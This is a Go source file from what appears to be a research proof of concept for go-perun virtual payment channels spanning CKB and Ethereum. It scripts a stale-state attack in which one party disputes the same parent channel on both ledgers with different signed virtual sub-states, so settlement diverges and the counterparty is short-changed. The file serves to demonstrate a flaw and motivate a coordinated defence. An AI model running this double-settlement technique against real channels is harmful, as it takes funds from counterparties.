// Copyright 2026 - See NOTICE file for copyright holders.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"context"
	"fmt"
	"log"
	"time"

	"perun.network/go-perun/channel"
	pclient "perun.network/go-perun/client"
	"perun.network/go-perun/wallet"

	"perun-multiledger-poc/multiledger-virtual-ckb-eth/client"
)

// runAttack performs the stale-state-on-virtual attack (POC §11.5). With no
// coordinator, Bob disputes the Bob-Ingrid parent at the SAME parent state on
// both ledgers but embeds a DIFFERENT virtual sub-state on each — vc0 on CKB,
// vc1 on ETH — so the virtual channel settles divergently and pays Bob his
// highest share on each chain. The recursive CoordinateVC defence in the
// coordinated module pins one virtual version on both ledgers and prevents it.
func runAttack(alice, bob, ingrid *Participant, chAB, chBA, chAI, chIA, chBI, chIB *client.PaymentChannel) {
	_ = alice
	_ = chAI
	_ = chIA
	ctx := context.Background()

	// Capture V's initial agreed state vc0 (both parties signed it at open).
	ss0 := signedStateOf(chBA)
	log.Printf("[attack] captured virtual state vc0 (v%d).", ss0.State.Version)

	// Advance V to a later agreed state vc1 via a cross-asset swap routed through
	// Ingrid: Alice pays Bob on ETH, Bob pays Alice on CKB. Both parties sign vc1,
	// so Bob legitimately holds witnesses for both vc0 and vc1.
	log.Println("[attack] advancing virtual channel to vc1 (cross-asset swap).")
	chAB.SendEthPayment(virtualEth / 2)        // Alice -> Bob on ETH.
	chBA.SendCKBPayment(int64(virtualCkb / 2)) // Bob -> Alice on CKB.
	ss1 := signedStateOf(chBA)
	log.Printf("[attack] captured virtual state vc1 (v%d).", ss1.State.Version)

	// Parent B (Bob-Ingrid) agreed adjudicator requests. The PARENT state is
	// identical on both ledgers — only the embedded virtual sub-state diverges.
	// Bob proposed parent B, so Bob is index 0 and Ingrid is index 1.
	parentReqBob := pclient.NewTestChannel(chBI.GetChannel()).AdjudicatorReq()
	parentReqIngrid := pclient.NewTestChannel(chIB.GetChannel()).AdjudicatorReq()
	// Bob is the primary disputer on both ledgers; Ingrid only collects her share,
	// so she withdraws as secondary. On CKB a force-close pays out both parties
	// from the single channel cell (her withdraw is a no-op); on ETH the secondary
	// still pulls her own allocation after Bob's conclude.
	parentReqIngrid.Secondary = true

	// Per-chain withdrawal sub-state maps: CKB folds vc0, ETH folds vc1.
	smap0 := channel.MakeStateMap()
	smap0.Add(ss0.State)
	smap1 := channel.MakeStateMap()
	smap1.Add(ss1.State)

	start := time.Now()

	// Step 1: CKB — register parent B carrying the STALE virtual state vc0
	// (Bob's CKB-favoured version), then wait out CKB's window in wall-clock time.
	log.Printf("[attack] [+%5.1fs] step 1: register parent B on CKB with virtual vc0 (v%d).",
		time.Since(start).Seconds(), ss0.State.Version)
	if err := bob.CkbAdj.Register(ctx, parentReqBob, []channel.SignedState{ss0}); err != nil {
		log.Fatalf("[attack] CKB register: %v", err)
	}
	waitChallenge(start, attackChallenge, "CKB")

	// Step 2: ETH — register the SAME parent B carrying the newer virtual state
	// vc1 (Bob's ETH-favoured version), then wait out ETH's window.
	log.Printf("[attack] [+%5.1fs] step 2: register parent B on ETH with virtual vc1 (v%d).",
		time.Since(start).Seconds(), ss1.State.Version)
	if err := bob.EthAdj.Register(ctx, parentReqBob, []channel.SignedState{ss1}); err != nil {
		log.Fatalf("[attack] ETH register: %v", err)
	}
	waitChallenge(start, attackChallenge, "ETH")

	// Step 3: each ledger pays out the parent folding its locally registered
	// virtual state — CKB at vc0, ETH at vc1.
	log.Println("[attack] both dispute windows elapsed — withdrawing divergently.")
	if err := bob.CkbAdj.Withdraw(ctx, parentReqBob, smap0); err != nil {
		log.Fatalf("[attack] Bob CKB withdraw: %v", err)
	}
	if err := ingrid.CkbAdj.Withdraw(ctx, parentReqIngrid, smap0); err != nil {
		log.Fatalf("[attack] Ingrid CKB withdraw: %v", err)
	}
	if err := bob.EthAdj.Withdraw(ctx, parentReqBob, smap1); err != nil {
		log.Fatalf("[attack] Bob ETH withdraw: %v", err)
	}
	if err := ingrid.EthAdj.Withdraw(ctx, parentReqIngrid, smap1); err != nil {
		log.Fatalf("[attack] Ingrid ETH withdraw: %v", err)
	}

	fmt.Println()
	fmt.Println("============================================================")
	fmt.Println("  STALE-STATE-ON-VIRTUAL ATTACK (parent B) — OUTCOME")
	fmt.Println("============================================================")
	fmt.Printf("  CKB folded the virtual channel at vc0 (v%d)\n", ss0.State.Version)
	fmt.Printf("  ETH folded the virtual channel at vc1 (v%d)\n", ss1.State.Version)
	fmt.Println("  Result: ATTACK SUCCEEDED — the virtual channel settled at a")
	fmt.Println("  different version on each ledger (divergent settlement).")
	fmt.Println("  Bob banked his highest share on each chain; Alice, whose only")
	fmt.Println("  witness is vc0, is short-changed. Coordinating just the parent")
	fmt.Println("  state cannot fix this — see the coordinated module (CoordinateVC).")
	fmt.Println("============================================================")
}

// signedStateOf snapshots a channel's current co-signed state (params + state +
// signatures) as a channel.SignedState, cloning so later updates to the channel
// do not mutate the captured snapshot.
func signedStateOf(ch *client.PaymentChannel) channel.SignedState {
	req := pclient.NewTestChannel(ch.GetChannel()).AdjudicatorReq()
	return channel.SignedState{
		Params: req.Params,
		State:  req.Tx.State.Clone(),
		Sigs:   append([]wallet.Sig(nil), req.Tx.Sigs...),
	}
}

// waitChallenge waits out a ledger's dispute window in wall-clock time. Both
// ledgers advance their dispute timers from real block production (CKB blocks;
// the ETH devnet mines every 500 ms), so there is no manual evm_increaseTime
// (POC §13); the small attackChallenge keeps this tractable.
func waitChallenge(start time.Time, seconds uint64, ledger string) {
	d := time.Duration(seconds+2) * time.Second
	log.Printf("[attack] [+%5.1fs] waiting %s for the %s challenge window…",
		time.Since(start).Seconds(), d, ledger)
	time.Sleep(d)
}
